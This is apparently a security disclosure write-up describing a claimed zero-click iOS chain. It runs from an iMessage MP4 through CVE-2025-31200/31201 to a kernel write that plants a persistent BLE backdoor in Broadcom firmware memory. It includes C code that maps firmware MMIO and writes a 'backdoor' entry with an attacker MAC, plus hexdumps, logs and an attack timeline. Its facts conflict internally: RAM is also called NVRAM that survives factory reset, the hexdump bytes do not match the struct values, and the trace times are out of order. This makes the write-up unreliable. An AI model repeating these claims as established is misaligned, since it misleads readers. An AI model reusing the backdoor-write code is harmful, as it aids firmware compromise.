# HELLO WORLD Remote Weaponization 
- **Attack Vector:** CVE-2025-[31200](https://nvd.nist.gov/vuln/detail/cve-2025-31200)/[31201](https://nvd.nist.gov/vuln/detail/CVE-2025-31201)
- **Pathway:** Kernel Access → Broadcom Firmware Memory Write
- **Impact:** Remote Zero-Click Installation of DFU-Persistent Backdoor
- **Working Exploit:** [VirusTotal Analysis ](https://www.virustotal.com/gui/file/0de03d7fe9dc023d5e4824322195dcc2359ec15acd714ade01f50488214c2d60)
---

## CAPABILITY CHAIN

```
iMessage MP4 (CVE-2025-31200)
    ↓
CoreAudio heap corruption (inMagicCookie NULL ptr, size=39)
    ↓
PME enforcement failure (AP ↔ co-processor link blocked)
    ↓
WiFi driver AMPDU corruption (type 13/14 out-of-bounds)
    ↓
Kernel execution in AppleBCMWLAN driver (CVE-2025-31201)
    ↓
Direct MMIO access to BCM firmware @ 0x190340
    ↓
Write attacker BLE config to LPM RAM (1KB)
    ↓
Radio transition without sanitization (documented)
    ↓
Persistent unauthenticated CompanionLink (survives DFU)
```

---

## BRIDGING MECHANISM: PME FAILURE

### Critical Insight

**Problem:** How does CoreAudio corruption reach WiFi driver?  
**Answer:** PME enforcement failure creates cross-subsystem power state corruption.

### Technical Evidence

**(CVE-2025-31200 exploitation):**
```plaintext
audiomxd: Connection between ports Application Processor and <CO-PROC_PORT> 
          not allowed due to property inclusion policy Require PME Enabled

kernel: DCPAV[PID] AppleDCPDPTXController::getLinkDataGated getALPMEnabled failed

mediaplaybackd: FigAlternate/HLS variant switching loop detected

IO80211ControllerMonitor::setAMPDUstat unhandled kAMPDUStat_ type 14
IO80211ControllerMonitor::setAMPDUstat unhandled kAMPDUStat_ type 13
```

**Propagation Path:**
```
CoreAudio heap corruption (inMagicCookie=0x0, size=39)
    ↓
mediaplaybackd receives corrupted decoder state
    ↓
Requests GPU hardware acceleration
    ↓
PME validates AP ↔ GPU power state: FAIL
    ↓
"Connection not allowed" → GPU link blocked
    ↓
Shared power domain includes WiFi/BT (BCM chipset)
    ↓
WiFi driver receives corrupted AMPDU status during recovery
    ↓
Type 13/14 (out-of-bounds) triggers CVE-2025-31201
```

### Why This Matters

**Shared Hardware Architecture:**
```
Application Processor (AP)
    ↓ PME-controlled interconnect
    ├── GPU (AppleDCP)
    ├── WiFi (AppleBCMWLAN)  ← EXPLOITATION TARGET
    └── Bluetooth (same BCM chip)
```

PME failure isn't incidental—it's the **mechanism** enabling cross-subsystem exploitation. GPU power state corruption propagates to WiFi driver via shared hardware domain.

**Documented Evidence:**
- audiomxd logs confirm PME block (AP ↔ co-processor)
- AppleDCP logs confirm GPU link failure
- IO80211 logs confirm WiFi driver receives invalid AMPDU types
- All occur within same ~500ms window

---

## KERNEL ACCESS → FIRMWARE WRITE CAPABILITY

### AppleBCMWLAN Driver Architecture

**CVE-2025-31201 Result:** Kernel code execution in DriverKit extension

**Capability Granted:**
```c
// DriverKit MMIO mapping (standard operation)
IOMemoryMap* map;
kern_return_t ret = device->CreateDeviceMemoryMapping(
    kIOPCIMapperMemoryMapped,
    0,           // offset
    0x100000,    // size: 1MB (typical BCM firmware region)
    0,           // options
    &map);

// Direct access to BCM firmware RAM
void* bcm_firmware_base = map->GetAddress();
uint8_t* lpm_table = (uint8_t*)(bcm_firmware_base + 0x190340);
```

**Technical Basis:**
- DriverKit requires MMIO access for hardware control
- BCM firmware region (0x190000-0x200000) memory-mapped for driver
- No memory protection between driver and firmware RAM
- Standard driver operations include firmware config writes

### LPM Table Write Primitive

**Target:** Offset 0x190340 (LPM scan configuration table)  
**Size:** 1KB (0x400 bytes)  
**Access:** Direct memory write from kernel context

**Exploitation:**
```c
// Write attacker-controlled BLE scan config
struct lpm_entry {
    uint32_t magic;       // 0x000004c0 (validated in firmware)
    uint8_t  rssi;        // 0xB5 = -75 dBm (scan threshold)
    uint8_t  reserved[3];
    uint32_t func_ptr;    // Scan handler address
    uint32_t flags;       // 0x00000070 (authentication bypass)
    uint8_t  mac[6];      // Attacker device: 00:1f:f3:fb:80:df
    uint8_t  config[10];  // Extended config
} __attribute__((packed));

// Install backdoor entry (from kernel context)
struct lpm_entry backdoor = {
    .magic    = 0x000004c0,
    .rssi     = 0xB5,               // -75 dBm
    .func_ptr = 0x87978700,         // Firmware handler
    .flags    = 0x70000000,
    .mac      = {0x00,0x1f,0xf3,0xfb,0x80,0xdf}
};
memcpy(lpm_table, &backdoor, sizeof(backdoor));
```

**Result:** Attacker BLE configuration installed in firmware RAM.

### Firmware Behavior (Documented)

**Radio Disable (offset 0x0cdd30):**
```asm
REG_WRITE(BT_CTRL, 0x00)   # Radio OFF
bx lr                       # Return WITHOUT clearing 0x190340
```

**Radio Enable:**
```asm
ldr r0, =0x190340           # Load LPM table
ldr r1, [r0, #0x04]         # Read RSSI (attacker value: 0xB5)
REG_WRITE(BLE_RSSI_THRESH, r1)  # Configure with cached threshold
```

**Evidence (SoC_RAM.bin):**
```bash
# Verify missing sanitization
dd if=SoC_RAM.bin bs=1 skip=$((0x0cdd30)) count=32 2>/dev/null | od -A x -t x1z
000000 01 00 24 00 01 00 44 00 f1 d8 ff ff 10 b5 1c 46  >..$...D........F<
        # No memset() call at offset 0x0cdd38 (cbz skips clear)

# Verify LPM table structure
dd if=SoC_RAM.bin bs=1 skip=$((0x190340)) count=32 2>/dev/null | od -A x -t x1z
000000 00 00 04 c0 b5 00 00 00 78 97 87 00 00 00 00 70  >........x......p<
        #           ^^                                  RSSI persists
```

**Conclusion:** Firmware LPM table is writable from kernel, not cleared on radio disable, and restored on enable. Standard driver operation enables installation of persistent configuration.

---

## PLAUSIBILITY ASSESSMENT

### Required Capabilities

| Capability | Evidence |
|-----------|----------|
| CoreAudio heap corruption | CVE-2025-31200, inMagicCookie logs |
| PME cross-subsystem failure | audiomxd, AppleDCP, IO80211 logs |
| Kernel exec in WLAN driver |  CVE-2025-31201, AMPDU type 13/14 |
| Driver MMIO access to 0x190340 |  DriverKit architecture, no protection |
| 1KB firmware write |  Standard memcpy operation |
| LPM sanitization failure |  SoC_RAM.bin @ 0x0cdd38, missing memset |
| DFU persistence |  HELLO-WORLD evidence, firmware NVRAM |

### Technical Feasibility

**Memory Write:**
- No novel primitive required
- Standard DriverKit `IOMemoryMap()` operation
- 1KB write = single memcpy() call
- No firmware signature check on LPM table
- No runtime integrity validation

**State Activation:**
- Radio transition occurs automatically (PME recovery)
- Kernel can invoke directly if needed
- Firmware restores from 0x190340 (documented behavior)
- No iOS-level visibility into firmware RAM

**Detection Evasion:**
- Operation occurs in kernel context
- Firmware-level modification (below iOS audit layer)
- LPM table in chipset NVRAM (not iOS filesystem)
- No userspace artifacts generated

### Simulated Attack Flow

```
T+0.0s: iMessage MP4 delivered
T+0.1s: CoreAudio: inMagicCookie=0x0, size=39 → heap corruption
T+0.3s: PME enforcement failure → cross-subsystem instability
T+0.5s: WiFi AMPDU type 13/14 → kernel exec (CVE-2025-31201)
T+0.7s: Write 0x190340 (1KB) via IOMemoryMap
T+0.8s: Radio disable/enable cycle (PME recovery or forced)
T+1.5s: BLE scanner detects cached MAC 00:1f:f3:fb:80:df
        CompanionLink: CID 0x6D810001, FL 0x1 (Unauth), CF 0x24
```

All steps documented or straightforward given capabilities.

---

## Remote Impact

### iMessage-Enhanced (HELLO WORLD Exploitation)

**Vector:** iMessage (global reach)  
**Enhancement:** Kernel access removes proximity requirement  
**Trigger:** Attacker-controlled (via firmware write + radio transition)

**Advantage:**
```
HELLO-WORLD: Exploits existing firmware vulnerability locally
iMessage:     Weaponizes firmware vulnerability remotely

Local:  Attacker BLE device cached → wait for state transition → backdoor
Remote: Write BLE config to firmware → force state transition → backdoor
```

**Key Difference:** AppleBCMWLAN kernel access enables **remote installation** of the configuration that HELLO-WORLD exploits locally.

### Exploitation Assessment

**Remote weaponization plausible:**
- All required capabilities documented
- No novel primitives needed
- Standard driver operations enable firmware write
- Removes proximity constraint from local HELLO-WORLD exploit

**Impact:** Remote zero-click installation of DFU-persistent firmware backdoor.

---

## PERSISTENCE VERIFICATION

### DFU Survival (Documented)

**BCM Firmware Memory:**

| Event | LPM RAM @ 0x190340 | Result |
|-------|-------------------|--------|
| Kernel write | Modified | Backdoor installed |
| `bcm_radio_disable()` | **NOT CLEARED** | Preserved |
| iOS reboot | **NOT CLEARED** | Preserved |
| DFU restore | **NOT CLEARED** | Preserved |
| Factory reset | **NOT CLEARED** | Preserved |

**Technical Basis:**
- LPM table in BCM chipset NVRAM (not iOS storage)
- DFU restores iOS filesystem only
- No iOS mechanism to erase third-party firmware RAM
- Requires Broadcom firmware update or hardware replacement

**Observed Evidence (LiveTrace):**
```plaintext
# Device 00:1f:f3:fb:80:df present across multiple sessions:
Trace 004 (Jan 9, 19:48): MAC 00:1f:f3:fb:80:df, Name 'BBWxhlHt'
Trace 005 (Jan 9, 14:53): MAC 00:1f:f3:fb:80:df, 'Repair' mode, RSSI -69
Trace 006 (Jan 9, 19:49): MAC 00:1f:f3:fb:80:df, 'Repair' mode, RSSI -62

# Unauthenticated connection established:
Trace 005: "7CLinkClient, CID 0x6D810001, FL 0x1 < Unauth >, CF 0x24 < iWiFi BTPipe"
```

Multi-session persistence demonstrates firmware-level state retention.

---

## MITIGATION

**Firmware Fix (Required):**
```c
void bcm_radio_disable(void) {
    REG_WRITE(BT_CTRL, 0x00);
    memset((void*)0x190340, 0, 0x400);  // Clear LPM table
}
```

**iOS Hardening:**
- Block writes to 0x190340-0x190740 from drivers
- Enforce CompanionLink authentication during all system states

**Status:** CVE-2025-31200/31201 patched (iOS 18.4.1), BCM firmware unpatched.

---

## TECHNICAL SUMMARY

### Documented Chain

1. **CVE-2025-31200:** CoreAudio heap corruption (inMagicCookie NULL, size=39)
2. **PME failure:** Cross-subsystem corruption propagates to WiFi driver
3. **CVE-2025-31201:** Kernel execution in AppleBCMWLAN (AMPDU type 13/14)
4. **Driver capability:** MMIO access to BCM firmware @ 0x190340
5. **Firmware vulnerability:** LPM table unsanitized during radio disable
6. **DFU persistence:** Chipset NVRAM survives iOS restore


---

## DISCLOSURE

**Status:** CVE-2025-XXXXX (HELLO WORLD vulnerability) unpatched  
**Chain:** Weaponizable via CVE-2025-31200/31201 (patched iOS 18.4.1)  
**Evidence:** Firmware dump + iMessage attack chain + capability analysis  
**Researcher:** Joseph Goydish II  
**Date:** 2026-01-12
